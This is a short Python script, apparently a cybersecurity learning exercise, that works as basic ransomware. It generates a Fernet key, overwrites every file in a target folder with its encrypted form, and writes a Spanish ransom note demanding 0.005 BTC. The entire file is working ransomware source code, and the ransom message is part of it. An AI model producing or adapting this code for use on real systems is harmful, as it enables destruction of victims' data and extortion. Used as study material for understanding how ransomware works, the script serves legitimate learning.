from cryptography.fernet import Fernet
import os

def genera_key():
    key= Fernet.generate_key()
    with open('key.key','wb') as key_file:
        key_file.write(key)

def retornar_key():
    return open("key.key", 'rb').read()


def encrypt(items,key):
    i= Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data = file.read()
        data = i.encrypt(file_data)
        
        with open(item,'wb') as file:
            file.write(data)
            
if __name__ == '__main__':
    path = "D:/Python proyect/Ciberseguridad/Prueba de Encriptamiento"
    items = os.listdir(path)
    archivo = [path+"\\"+x for x in items]
    
genera_key()
key = retornar_key()

encrypt(archivo, key)

with open(path+"\\"+"Leeme.txt",'w') as file:
    file.write("Los archivos fueron encriptados por un Ransoware\n")
    file.write("Se colicita un rescate por tus archivos de 0.005 BTC \n")
    file.write("By Anonimous")